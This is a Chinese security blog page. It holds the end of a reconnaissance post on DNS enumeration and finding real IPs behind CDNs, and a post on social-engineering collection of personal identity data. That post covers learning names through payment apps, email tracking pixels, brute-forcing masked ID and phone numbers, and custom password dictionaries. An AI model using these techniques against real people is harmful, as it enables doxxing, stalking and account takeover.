<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input:ip.txt</span><br><span class="line">executing: python3 info-ipsection.py</span><br><span class="line">output:ip_result.txt</span><br><span class="line"># 归档在 https://github.com/aplyc1a/toolkits中。</span><br></pre></td></tr></table></figure>



<h3 id="3-域名资产梳理"><a href="#3-域名资产梳理" class="headerlink" title="3 域名资产梳理"></a>3 域名资产梳理</h3><h4 id="3-1-常用域名服务器"><a href="#3-1-常用域名服务器" class="headerlink" title="3.1 常用域名服务器"></a>3.1 常用域名服务器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">国内：</span></span><br><span class="line">114.114.114.114  # 运营商通用DNS</span><br><span class="line">114.114.115.115  # 运营商通用DNS</span><br><span class="line">114.114.114.119  # 运营商通用DNS</span><br><span class="line">114.114.114.110  # 运营商通用DNS</span><br><span class="line">223.5.5.5        # 阿里公共DNS</span><br><span class="line">223.6.6.6        # 阿里公共DNS</span><br><span class="line">180.76.76.76     # 百度公共DNS</span><br><span class="line">119.29.29.29     # 腾讯DNSpod</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">国外：</span></span><br><span class="line">8.8.8.8          # google公共DNS</span><br><span class="line">8.8.4.4          # google公共DNS</span><br><span class="line">208.67.222.222   # OpenDNS</span><br><span class="line">208.67.220.220   # OpenDNS</span><br><span class="line">208.67.222.123   # OpenDNS Family</span><br><span class="line">208.67.220.123   # OpenDNS Family</span><br><span class="line">199.91.73.222    # V2EX DNS</span><br><span class="line">178.79.131.110   # V2EX DNS</span><br><span class="line">216.146.35.35    # Dyn DNS</span><br><span class="line">216.146.36.36    # Dyn DNS</span><br><span class="line">8.26.56.26       # Comodo Secure</span><br><span class="line">8.20.247.20      # Comodo Secure</span><br><span class="line">156.154.70.1     # UltraDNS</span><br><span class="line">156.154.71.1     # UltraDNS</span><br><span class="line">199.85.126.10    # Norton ConnectSafe</span><br><span class="line">199.85.127.10    # Norton ConnectSafe</span><br></pre></td></tr></table></figure>



<h4 id="3-2-子域名挖掘"><a href="#3-2-子域名挖掘" class="headerlink" title="3.2 子域名挖掘"></a>3.2 子域名挖掘</h4><h5 id="3-2-1-利用子域名历史解析记录"><a href="#3-2-1-利用子域名历史解析记录" class="headerlink" title="3.2.1 利用子域名历史解析记录"></a>3.2.1 利用子域名历史解析记录</h5><p><a target="_blank" rel="noopener" href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a></p>
<p><a target="_blank" rel="noopener" href="https://securitytrails.com/list/apex_domain/%E5%85%B7%E4%BD%93%E5%9F%9F%E5%90%8D">https://securitytrails.com/list/apex_domain/具体域名</a></p>
<h5 id="3-2-2-利用枚举工具"><a href="#3-2-2-利用枚举工具" class="headerlink" title="3.2.2 利用枚举工具"></a>3.2.2 利用枚举工具</h5><p>子域名挖掘机5.0：支持多级枚举。</p>
<p>subDomainsBrute：python2写的字典枚举工具。</p>
<h5 id="3-2-3-DNS域传送配置漏洞"><a href="#3-2-3-DNS域传送配置漏洞" class="headerlink" title="3.2.3 DNS域传送配置漏洞"></a>3.2.3 DNS域传送配置漏洞</h5><p>DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录。 通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录。</p>
<p>非常少见。对于有域传送漏洞的DNS服务器，可以使用以下命令:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @某漏洞的DNSServer -t axfr 待查的域名</span><br></pre></td></tr></table></figure>

<h4 id="3-3-旁站挖掘"><a href="#3-3-旁站挖掘" class="headerlink" title="3.3 旁站挖掘"></a>3.3 旁站挖掘</h4><p><a target="_blank" rel="noopener" href="https://c.webscan.cc/">https://c.webscan.cc/</a></p>
<p><a target="_blank" rel="noopener" href="https://chapangzhan.com/">https://chapangzhan.com/</a></p>
<p><a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a></p>
<h4 id="3-4-域名转IP"><a href="#3-4-域名转IP" class="headerlink" title="3.4 域名转IP"></a>3.4 域名转IP</h4><p>手工查询有3种方式：</p>
<p>1、手工ping。</p>
<p>2、手工nslookup。nslookup domain DNSServer</p>
<p>3、手工dig。dig domain @DNSServer</p>
<p>工具查询，写好了一个通过dig批量查询所有DNS record并进行导出的python脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input:domain.txt</span><br><span class="line">executing: python3 info-dnsdigger.py</span><br><span class="line">output:nslookup.csv</span><br><span class="line"># 归档在 https://github.com/aplyc1a/toolkits中。</span><br></pre></td></tr></table></figure>

<h4 id="3-5-IP真实性判定"><a href="#3-5-IP真实性判定" class="headerlink" title="3.5 IP真实性判定"></a>3.5 IP真实性判定</h4><h5 id="3-5-1-检测"><a href="#3-5-1-检测" class="headerlink" title="3.5.1 检测"></a>3.5.1 检测</h5><p>基本原理是判断一个域名是否绑定在某个固定的IP上。</p>
<p>如果在进行域名转IP的过程中发现以下现象，说明得到的IP不准确，可能存在CDN或其他waf类设备：</p>
<ul>
<li>1.多次ping域名，IP地址不唯一。</li>
<li>2.选择不同的DNS服务器进行查询或查询结果中发现A记录的IP不唯一。</li>
<li>3.DNS查询时发现CNAME指向了某waf类或cdn域名。</li>
<li>4.使用在线工具发现多地返回的地址不唯一。（如，<a target="_blank" rel="noopener" href="https://myssl.com/cdn_check.html%E3%80%81https://www.yunsee.cn/%E3%80%81http://ping.chinaz.com%E3%80%81http://ping.aizhan.com%E3%80%81http://ce.cloud.360.cn%EF%BC%89">https://myssl.com/cdn_check.html、https://www.yunsee.cn/、http://ping.chinaz.com、http://ping.aizhan.com、http://ce.cloud.360.cn）</a></li>
</ul>
<h5 id="3-5-2-确定"><a href="#3-5-2-确定" class="headerlink" title="3.5.2 确定"></a>3.5.2 确定</h5><p>一旦识别到了CDN，就要考虑有没有办法绕过CDN发现真实IP：</p>
<ul>
<li>1.统计其他子域名，总结出可能的C段。对C段进行端口服务发现。</li>
<li>2.利用公开的DNS历史解析记录数据库，发现该域名绑定过的IP。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br><span class="line">https://tools.ipip.net/cdn.php</span><br></pre></td></tr></table></figure>


<ul>
<li><p>3.网络安全搜索引擎。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.fofa查询,过滤页面关键字。body=&quot;抓手&quot;、title=&quot;beijing&quot;、icp=&quot;京ICP证030173号&quot;</span><br><span class="line">2.censys查询，过滤cdn与目标间的ssl证书。parsed.names: xyz123boot.com and tags.raw: trusted 或直接搜证书的散列值。在结果中看IPv4主机地址。</span><br></pre></td></tr></table></figure></li>
<li><p>4.邮件订阅功能。如果目标含有RSS邮件订阅功能，通过分析邮件标头内的发送人信息，有时能获得目标的真实IP。</p>
</li>
<li><p>5.F5 LTM做CDN时，set-cookie关键字的value字段含有目标的真实IP。可以先将value值的第一段转为16进制，分为4部分，再由后往前，依次推出IP地址。</p>
</li>
</ul>
<h3 id="4-资产梳理"><a href="#4-资产梳理" class="headerlink" title="4 资产梳理"></a>4 资产梳理</h3><h4 id="4-1-web资产发现"><a href="#4-1-web资产发现" class="headerlink" title="4.1 web资产发现"></a>4.1 web资产发现</h4><p>webfinder.jar</p>
<p>goby</p>
<p>网络安全搜索引擎搜IP</p>
<h4 id="4-2-web组件指纹识别"><a href="#4-2-web组件指纹识别" class="headerlink" title="4.2 web组件指纹识别"></a>4.2 web组件指纹识别</h4><p>whatweb</p>
<h4 id="4-3-web路径爆破"><a href="#4-3-web路径爆破" class="headerlink" title="4.3 web路径爆破"></a>4.3 web路径爆破</h4><p><strong>Windows</strong>：御剑</p>
<p><strong>Linux</strong>：DirBuster、Dirmap</p>
<h4 id="4-4-其他服务"><a href="#4-4-其他服务" class="headerlink" title="4.4 其他服务"></a>4.4 其他服务</h4><p>nessus</p>
<p>goby</p>
<p>nmap</p>
<h3 id="5-其他信息收集方式"><a href="#5-其他信息收集方式" class="headerlink" title="5 其他信息收集方式"></a>5 其他信息收集方式</h3><h4 id="5-1-图片搜索"><a href="#5-1-图片搜索" class="headerlink" title="5.1 图片搜索"></a>5.1 图片搜索</h4><p>利用百度识图、google识图等工具，在网上找到相似图片或原图，进而发现其他相关信息。</p>
<h4 id="5-2-icon指纹识别"><a href="#5-2-icon指纹识别" class="headerlink" title="5.2 icon指纹识别"></a>5.2 icon指纹识别</h4><p>fofa：icon搜索</p>
<p>shodan：http.favicon.hash搜索</p>
<p>zoomeye：iconhash搜索</p>
<h4 id="5-3-证书查询"><a href="#5-3-证书查询" class="headerlink" title="5.3 证书查询"></a>5.3 证书查询</h4><p><a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a></p>
<p><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E7%A4%BE%E5%B7%A5%E8%87%AA%E7%84%B6%E4%BA%BA%E4%BF%A1%E6%81%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/21/%E7%A4%BE%E5%B7%A5%E8%87%AA%E7%84%B6%E4%BA%BA%E4%BF%A1%E6%81%AF/" class="post-title-link" itemprop="url">社工工程-自然人身份收集</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-21 20:12:00 / Modified: 23:09:19" itemprop="dateCreated datePublished" datetime="2021-06-21T20:12:00-08:00">2021-06-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>人，是网络安全全流程中最大的弱点。针对人的攻击往往有出奇不意的效果。而想要利用人的弱点进行攻击，那么对目标的信息收集与了解就是非常重要的了。这篇文章记录了一些常用的用于对人进行身份信息收集的技术。这些技术常被用于溯源取证、社工攻击。</p>
<h2 id="0x00-社工分析中的身份信息收集"><a href="#0x00-社工分析中的身份信息收集" class="headerlink" title="0x00 社工分析中的身份信息收集"></a>0x00 社工分析中的身份信息收集</h2><p>关于人的社工分析有很多维度的信息都值得被关注。但不管怎样，开展身份信息社工工作往往都是从一些关于人的最基本的信息开始的，身份信息的收集过程就是尽可能使用有限信息关联出其他信息的过程。</p>
<p>这里，将关于人的信息，简单分为两大类。</p>
<p>第一类，基本信息。如：<strong>姓名</strong>，<strong>昵称</strong>，<strong>手机号码</strong>，<strong>邮箱地址</strong>，<strong>各类证件</strong>，<strong>社交账号</strong>。这类信息能在溯源中帮助确定人的身份。是人在进行社交过程中不可避免使用的信息，用来在社会中表明他的身份，是在社会中生活的名片。</p>
<p>第二类，其他信息。如：<strong>居住地</strong>、<strong>爱好</strong>、<strong>家庭状况</strong>、<strong>婚姻状态</strong>、<strong>职业</strong>。这类信息能帮助我们更好的了解一个人的生活习惯与生活状态，代表人的特点。在生成定制化的社工字典时很有用。</p>
<p>下面介绍常用到的信息收集方法。</p>
<h3 id="1-搜索引擎关键字检索"><a href="#1-搜索引擎关键字检索" class="headerlink" title="1 搜索引擎关键字检索"></a>1 搜索引擎关键字检索</h3><p>最傻但往往最有效的办法，就是关键字搜索。但想要达到比较好的效果，依赖不少条件：</p>
<p>1.关键字不能过于过于大众化，可以选择多个与目标相关的关键字组合；</p>
<p>2.目标必须在互联网上有一定的活跃度;</p>
<p>3.尽量使用google、duckduckgo等国外搜索引擎。他们的屏蔽的网页与结果较少。</p>
<h3 id="2-已注册网站查询"><a href="#2-已注册网站查询" class="headerlink" title="2 已注册网站查询"></a>2 已注册网站查询</h3><p>互联网上存在一类网站，这类网站旨在收集并存储用户的各种活动信息用以构建用户画像，或收集历次信息泄露事件中的数据库。这里先不讨论此类网站动机如何，是否真实有效，但一定程度上也给其他人提供了获得目标更多信息的方式。通过泛社工库查询，可以获得目标注册过的社交网站、甚至旧密码。</p>
<h4 id="2-1-REG007"><a href="#2-1-REG007" class="headerlink" title="2.1 REG007"></a>2.1 REG007</h4><p>查询<strong>邮箱</strong>、<strong>手机号</strong>注册过哪些社交平台：<a target="_blank" rel="noopener" href="http://www.reg007.com/">www.reg007.com</a></p>
<h4 id="2-2-手工查询"><a href="#2-2-手工查询" class="headerlink" title="2.2 手工查询"></a>2.2 手工查询</h4><p>使用个网站的注册功能输入目标的邮箱地址或手机号，查看页面是否提示该邮箱、手机号被占用。</p>
<h3 id="3-社工库查询"><a href="#3-社工库查询" class="headerlink" title="3 社工库查询"></a>3 社工库查询</h3><p>搭建社工库泄露用户隐私数据是犯法的。公网上很难找到，提供泄露数据细节的社工库，如果真的有，那么其动机也是值得高度怀疑的，使用时输入的信息极有可能被记录，用于溯源与黑吃黑。比较多的是一类脱敏后的网站，帮助用户查询自己的信息是否泄露。这两种方式都能帮助判断目标是否注册了某平台的账号。</p>
<h4 id="3-1-泄露检查查询"><a href="#3-1-泄露检查查询" class="headerlink" title="3.1 泄露检查查询"></a>3.1 泄露检查查询</h4><table>
<thead>
<tr>
<th>网站名</th>
<th>地址</th>
<th>可查询项</th>
</tr>
</thead>
<tbody><tr>
<td>Firefox Monitor</td>
<td><a target="_blank" rel="noopener" href="https://monitor.firefox.com/">https://monitor.firefox.com</a></td>
<td>邮箱</td>
</tr>
<tr>
<td>HaveIBeenPwned</td>
<td><a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a></td>
<td>邮箱</td>
</tr>
<tr>
<td>Aleph</td>
<td><a target="_blank" rel="noopener" href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></td>
<td>名称、手机号码、邮箱</td>
</tr>
<tr>
<td>snusbase</td>
<td><a target="_blank" rel="noopener" href="https://snusbase.com/">https://snusbase.com/</a></td>
<td>邮箱、名称、IP、电话、哈希、密码</td>
</tr>
<tr>
<td>checkusernames</td>
<td><a target="_blank" rel="noopener" href="https://checkusernames.com/">https://checkusernames.com/</a></td>
<td>名称</td>
</tr>
<tr>
<td>Intelligence X</td>
<td><a target="_blank" rel="noopener" href="https://intelx.io/">https://intelx.io/</a></td>
<td>邮箱、IP、CIDR、比特币地址</td>
</tr>
<tr>
<td>dehashed</td>
<td><a target="_blank" rel="noopener" href="http://www.dehashed.com/">http://www.dehashed.com/</a></td>
<td>邮箱、用户名、IP</td>
</tr>
<tr>
<td>IsLeaked</td>
<td><a target="_blank" rel="noopener" href="https://isleaked.com/">https://isleaked.com/</a></td>
<td>邮箱</td>
</tr>
<tr>
<td>KnowEm</td>
<td><a target="_blank" rel="noopener" href="https://knowem.com/">https://knowem.com/</a></td>
<td>名称</td>
</tr>
</tbody></table>
<h4 id="3-2-社工库查询"><a href="#3-2-社工库查询" class="headerlink" title="3.2 社工库查询"></a>3.2 社工库查询</h4><h3 id="4-姓名确认术"><a href="#4-姓名确认术" class="headerlink" title="4 姓名确认术"></a>4 姓名确认术</h3><h4 id="4-1-通过手机号确定姓名"><a href="#4-1-通过手机号确定姓名" class="headerlink" title="4.1 通过手机号确定姓名"></a>4.1 通过手机号确定姓名</h4><p>1&gt; 支付宝</p>
<p>当手机号绑定了支付宝且完成了实名认证时，通过支付宝转账功能可以查到对方的姓名。</p>
<p>如果对方的姓名只有两个字，只需手工猜出姓即可。</p>
<p>如果对方的姓名多于两个字，可以知道最后一个名，并通过枚举姓的方式确定到姓。</p>
<p>通过以上的方式，能保证在未实际转账的情况下获得姓名中的绝大部分。如果使用支付宝使用<strong>工商银行</strong>/<strong>网商银行</strong>进行转账，且转账成功，那么在银行app的查询明细中能看到姓名全称。</p>
<p>ps: 微信的“<strong>银行卡或手机号转账</strong>”也有相同的效果，但是开通微信手机号转账的人很少。</p>
<p>2&gt; 钉钉</p>
<p>如果目标使用过钉钉，可以使用在钉钉内使用手机号搜索，可以直接查出用户名。</p>
<p>3&gt; 社工库</p>
<h4 id="4-2-百家姓频数表"><a href="#4-2-百家姓频数表" class="headerlink" title="4.2 百家姓频数表"></a>4.2 百家姓频数表</h4><p>鉴于有时需要用到姓名猜测，有一个关于姓的频数统计表还是蛮有作用的，能帮我们从高频到低频尽快的猜到正确的姓。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">李 王 张 刘 陈 杨 赵 黄 周 吴 徐 孙 胡 朱 高 林 何 郭 马 罗 梁 宋 郑 谢 韩 唐 冯 于 董 萧 程 曹 袁 邓 许 傅 沈 曾 彭 吕 苏 卢 蒋 蔡 贾 丁 魏 薛 叶 阎 余 潘 杜 戴 夏 钟 汪 田 任 姜 范 方 石 姚 谭 廖 邹 熊 金 陆 郝 孔 白 崔 康 毛 邱 秦 江 史 顾 侯 邵 孟 龙 万 段 漕 钱 汤 尹 黎 易 常 武 乔 贺 赖 龚 文 庞 樊 兰 殷 施 陶 洪 翟 安 颜 倪 严 牛 温 芦 季 俞 章 鲁 葛 伍 韦 申 尤 毕 聂 丛 焦 向 柳 邢 路 岳 齐 沿 梅 莫 庄 辛 管 祝 左 涂 谷 祁 时 舒 耿 牟 卜 路 詹 关 苗 凌 费 纪 靳 盛 童 欧 甄 项 曲 成 游 阳 裴 席 卫 查 屈 鲍 位 覃 霍 翁 隋 植 甘 景 薄 单 包 司 柏 宁 柯 阮 桂 闵 欧阳 解 强 柴 华 车 冉 房 边 滕 晋 苑 邬 臧 畅 宫 来  苟 全 褚 廉 简 娄 盖 符 奚 木 穆 党 燕 郎 邸 冀 谈 姬 屠 连 郜 晏 栾 郁 商 蒙 计 喻 揭 窦 迟 宇 敖 糜 鄢 冷 卓 花 仇 艾 蓝 都 巩 稽 井 练 仲 乐 虞 卞 封 竺 冼 原 官 衣 楚 佟 栗 匡 宗 应 台 巫 鞠 僧 桑 荆 谌 银 扬 </span><br></pre></td></tr></table></figure>



<h3 id="5-社交账号社工术"><a href="#5-社交账号社工术" class="headerlink" title="5 社交账号社工术"></a>5 社交账号社工术</h3><h4 id="5-1-微信、支付宝"><a href="#5-1-微信、支付宝" class="headerlink" title="5.1 微信、支付宝"></a>5.1 微信、支付宝</h4><p>微信、支付宝直接在添加好友处搜手机号</p>
<h4 id="5-2-QQ、快手、抖音、百度云网盘、京东、脉脉、网易云、微博"><a href="#5-2-QQ、快手、抖音、百度云网盘、京东、脉脉、网易云、微博" class="headerlink" title="5.2 QQ、快手、抖音、百度云网盘、京东、脉脉、网易云、微博"></a>5.2 QQ、快手、抖音、百度云网盘、京东、脉脉、网易云、微博</h4><p>将手机号存入通讯录，然后在以下社交账号内开启通讯录同步，点<strong>添加/发现好友</strong>，获得对方社交账号。（需要开启应用访问通讯录权限）</p>
<h4 id="5-3-搜索引擎关键词查找"><a href="#5-3-搜索引擎关键词查找" class="headerlink" title="5.3 搜索引擎关键词查找"></a>5.3 搜索引擎关键词查找</h4><p>在google、duckduckgo上搜索手机号</p>
<h4 id="5-4-社工库"><a href="#5-4-社工库" class="headerlink" title="5.4 社工库"></a>5.4 社工库</h4><h3 id="6-位置信息"><a href="#6-位置信息" class="headerlink" title="6 位置信息"></a>6 位置信息</h3><h4 id="6-1-时区"><a href="#6-1-时区" class="headerlink" title="6.1 时区"></a>6.1 时区</h4><p>通过人的社交时间、语言、分享动态推断目标大致所在的时区。</p>
<h4 id="6-2-精确位置"><a href="#6-2-精确位置" class="headerlink" title="6.2 精确位置"></a>6.2 精确位置</h4><p><strong>屌丝级</strong>：<strong>各类带有地理位置元数据的文件</strong>、<strong>keep</strong>、<strong>行者</strong>、<strong>朋友圈</strong>分享的位置记录</p>
<p><strong>黑客级</strong>：欺骗用户安装能够实时获取GPS坐标的APP、诱导用户点击获取位置的链接</p>
<p><strong>政府级</strong>：利用小区基站实现定位、利用信令漏洞定位</p>
<h4 id="6-3-通过IP查地理位置"><a href="#6-3-通过IP查地理位置" class="headerlink" title="6.3 通过IP查地理位置"></a>6.3 通过IP查地理位置</h4><p>IP地理位置查询：<a target="_blank" rel="noopener" href="https://qifu.baidu.com/?activeKey=SEARCH_IP">https://qifu.baidu.com/?activeKey=SEARCH_IP</a></p>
<p>IP地址定位：<a target="_blank" rel="noopener" href="https://www.ipuu.net/">https://www.ipuu.net</a></p>
<h3 id="7-邮箱信息收集"><a href="#7-邮箱信息收集" class="headerlink" title="7 邮箱信息收集"></a>7 邮箱信息收集</h3><p>显然的，腾讯系的邮箱基本都是以数字打头的，暴露了QQ号。</p>
<p>部分网易126，163邮箱以手机号命名，暴露了手机号。</p>
<p>部分邮箱以名称+数字命名，暴露了姓名。</p>
<h4 id="7-1-收方回溯发方地址"><a href="#7-1-收方回溯发方地址" class="headerlink" title="7.1 收方回溯发方地址"></a>7.1 收方回溯发方地址</h4><p>查看邮件信件代码，标头内可以看到发送者的地址信息。</p>
<p>如果邮件表头内含有”X-Originating-IP:”的key值，value值即为发送者的IP。比较常见的QQ邮箱、126邮箱，都有本字段。</p>
<p>如果没有该字段，可以考虑标头内的Received字段。（多个Received字段时考虑最底部的，不一定有，有也不一定准）</p>
<h4 id="7-2-发方写邮件探针"><a href="#7-2-发方写邮件探针" class="headerlink" title="7.2 发方写邮件探针"></a>7.2 发方写邮件探针</h4><p>原理是通过在邮件内容中嵌入动态加载的外部图片，当收信人点开邮件时就会在图片服务器上留下IP。</p>
<p>具体方式是以源代码或文本模式写一封邮件，在邮件正文中嵌入图片html格式的图片链接。可以将图片自身的大小设的非常小，且将img字段设为不可见。这样攻击者打开邮件也无法感知。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://n.sinaimg.cn/sinacn04/787/w440h347/20180725/5fc6-hftenia0102640.jpg&quot; w=&quot;440&quot; h=&quot;347&quot; wh=&quot;1.27&quot; alt=&quot;一组萌萌哒小猫咪表情包&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="8-脱敏恢复"><a href="#8-脱敏恢复" class="headerlink" title="8  脱敏恢复"></a>8  脱敏恢复</h3><h4 id="8-1-身份证号脱敏恢复"><a href="#8-1-身份证号脱敏恢复" class="headerlink" title="8.1 身份证号脱敏恢复"></a>8.1 身份证号脱敏恢复</h4><p>身份证号是的编排是有一定规律可循的。除了最后1位是校验位外，其余各位与出生地、出生日期、性别、出生编号系系相关，因此即使是经脱敏处理的身份证号，仍能通过程序分析的方式过滤出可能的身份证序列组合。</p>
<p>这里写了一个<a target="_blank" rel="noopener" href="https://github.com/aplyc1a/toolkits/blob/master/0x01%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/info-sfz.py">脱敏身份证恢复工具</a>，支持对身份证后4、6位及身份证内生日的爆破。</p>
<h4 id="8-2-手机号脱敏恢复"><a href="#8-2-手机号脱敏恢复" class="headerlink" title="8.2 手机号脱敏恢复"></a>8.2 手机号脱敏恢复</h4><p>介绍怎么尽可能的恢复手机号的所有位数，但在此之前需要一定的知识介绍。</p>
<p>手机号码的11位是有规律可循的。</p>
<table>
<thead>
<tr>
<th>1-3位</th>
<th>4-7位</th>
<th>8-11位</th>
</tr>
</thead>
<tbody><tr>
<td>移动接入码</td>
<td>地区编码</td>
<td>用户号码</td>
</tr>
</tbody></table>
<p><strong>移动接入码</strong></p>
<table>
<thead>
<tr>
<th>运营商类型</th>
<th>移动接入码</th>
</tr>
</thead>
<tbody><tr>
<td>电信</td>
<td>133 149 153 173 174 177 180 181 189 191 199</td>
</tr>
<tr>
<td>联通</td>
<td>130 131 132 145 146 155 156 166 167 171 175 176 185 186</td>
</tr>
<tr>
<td>移动</td>
<td>134 135 136 137 138 139 147 148 150 151 152 157 158 159 172  178 182 183 184 187 188 195 198</td>
</tr>
<tr>
<td>虚拟运营商</td>
<td>162  165 167 170 171</td>
</tr>
</tbody></table>
<p>移动接入码是由运营商去向工信部申请，由工信部统一颁发的，每颁发一次，都会发布一个《电信网号码资源使用证书》。通过下载历年的证书我们能获得不同号段的分配说明。这里有个问题，国家这些年一直在推携号转网，初衷是帮助用户能够自主切换号码的运营商，如果真的全面推展开，且大家的使用积极性很高的化，那移动接入码就不再能准确区分手机号码是哪家运营商的了，但从目前的结果来看，通过移动接入码来判断运营商归属仍然是一个高度有效的方法。</p>
<p><strong>地区编码</strong></p>
<p>地区编码的具体数值分配由各运营商管理，因此很难给出一个通用的结构组成。所幸，网上有人专门通过爬虫等方式收集了运营商的地区编码数据库。如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/dannyhu926/phone_location">https://github.com/dannyhu926/phone_location</a></p>
<h5 id="8-2-1-已知目标手机号前3后4位-城市"><a href="#8-2-1-已知目标手机号前3后4位-城市" class="headerlink" title="8.2.1 已知目标手机号前3后4位+城市"></a>8.2.1 已知目标手机号前3后4位+城市</h5><p>使用下面这个shell命令简单分析以下，可以发现，如果移动接入码固定的情况下，一个城市的前7位（移动接入码+地区编码）的可能性不超过5000,更普遍的情况下是可以控制在500以内的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array=( 134 135 136 137 138 139 147 148 150 151 152 157 158 159 172 178 182 183 184 187 188 195 198 130 131 132 145 146 155 156 166 167 171 175 176 185 186 133 149 153 173 174 177 180 181 189 191 199 )</span><br><span class="line">for i in $&#123;array[@]&#125;; do     cat phone_location.sql |grep &quot;&#x27;$i&#x27;&quot;|awk &#x27;&#123;print $8&#125;&#x27;|sort -nr | uniq -c|sort -nr|head -n 1; done</span><br></pre></td></tr></table></figure>



<p>因此，这时，如果已知手机号前3后4位时，如果知道目标所处的位置将能极大的缩小目标号码的可能范围。结果的可能数&lt;=5000。</p>
<h5 id="8-2-2-已知目标手机号后4位-城市"><a href="#8-2-2-已知目标手机号后4位-城市" class="headerlink" title="8.2.2 已知目标手机号后4位+城市"></a>8.2.2 已知目标手机号后4位+城市</h5><p>使用下面的shell命令简单分析一下，可以发现，如果只知道目标所处的城市，那么前7位的可能性不超过20000。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear;cat phone_location.sql |awk &#x27;&#123;print $8&#125;&#x27;|sort -nr|uniq -c |sort -nr|head -n 10</span><br></pre></td></tr></table></figure>

<p>因此，总的来说这种情况下需要遍历的手机号可能不超过20000。</p>
<h5 id="8-2-3-已知后4位"><a href="#8-2-3-已知后4位" class="headerlink" title="8.2.3 已知后4位"></a>8.2.3 已知后4位</h5><p>如果只知道后4位别的一概不知，则要尝试482049次，才能保证遍历到正确的目标号码。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear;cat phone_location.sql |grep &quot;INSERT&quot;|grep &quot;phone_location&quot;|wc -l</span><br></pre></td></tr></table></figure>



<h3 id="9-其他"><a href="#9-其他" class="headerlink" title="9 其他"></a>9 其他</h3><p>围绕得到的基本信息，可以在社交帐号内进行进一步的信息挖掘，获得其他信息。</p>
<h4 id="9-1-字典定制化"><a href="#9-1-字典定制化" class="headerlink" title="9.1 字典定制化"></a>9.1 字典定制化</h4><p>理想情况下的一个人的互联网账户都要满足登录密码需要满足长度、复杂度、无意义、唯一性的要求，但实际操作起来这是几乎不可能的。</p>
<p>实际场景下对口令的选取往往围绕用户自身及周边的特点展开。如果信息收集的足够彻底，我们可以依据以下的信息，生成关键词根，通过词根间的组合填充，进而生成定制化字典。</p>
